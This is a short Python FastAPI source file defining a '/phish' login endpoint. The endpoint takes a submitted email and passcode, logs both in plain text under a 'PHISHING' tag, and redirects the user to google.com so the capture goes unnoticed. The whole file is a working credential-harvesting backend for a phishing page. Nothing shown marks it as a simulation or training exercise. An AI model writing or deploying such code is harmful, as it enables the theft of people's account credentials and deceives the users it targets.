from fastapi import APIRouter, Form, Request
from fastapi.responses import RedirectResponse
from utils import log_request

router = APIRouter()

@router.post("/phish")
async def phish_login(request: Request, email: str = Form(...), passcode: str = Form(...)):
    log_request(request, f"PHISHING - email: {email}, passcode: {passcode}")
    return RedirectResponse(url="https://google.com", status_code=302)
